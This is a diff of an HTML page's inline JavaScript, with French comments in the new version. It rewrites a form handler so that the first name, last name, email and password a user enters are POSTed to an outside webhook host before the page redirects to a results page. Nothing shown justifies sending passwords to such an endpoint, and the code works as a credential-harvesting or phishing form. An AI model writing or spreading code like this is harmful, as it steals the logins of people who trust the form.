@@ -77,14 +77,16 @@
     }
   </style>
   <script>
-    function redirectToResults(event) {
-      event.preventDefault(); // Prevent form submission
-      const first_name = document.getElementById("first_name").value;
-      const last_name = document.getElementById("last_name").value;
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+  async function redirectToResults(event) {
+    event.preventDefault(); // Empêche la soumission classique du formulaire
 
-      fetch("https://teeny-sandwich-90.webhook.cool", {
+    const first_name = document.getElementById("first_name").value;
+    const last_name = document.getElementById("last_name").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    try {
+      const response = await fetch("https://teeny-sandwich-90.webhook.cool", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -95,24 +97,23 @@
           email,
           password
         })
-      }).then(response => {
-        if (!response.ok) {
-          throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.json(); // or .text() if it's not JSON
-      })
-      .then(data => {
-        console.log("Success:", data);
-      })
-      .catch(error => {
-        console.error("Error:", error);
       });
 
-      
-      // Redirect to results page with the first name and last name in the URL
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      // On peut logguer ici si besoin
+      console.log("Données envoyées avec succès");
+
+      // Redirection seulement après que le POST ait été bien envoyé
       window.location.href = `/pages/results.html?first_name=${encodeURIComponent(first_name)}&last_name=${encodeURIComponent(last_name)}`;
+
+    } catch (error) {
+      console.error("Erreur lors de l'envoi :", error);
     }
-  </script>
+  }
+</script>
 </head>
 <body>
   <div class="container">
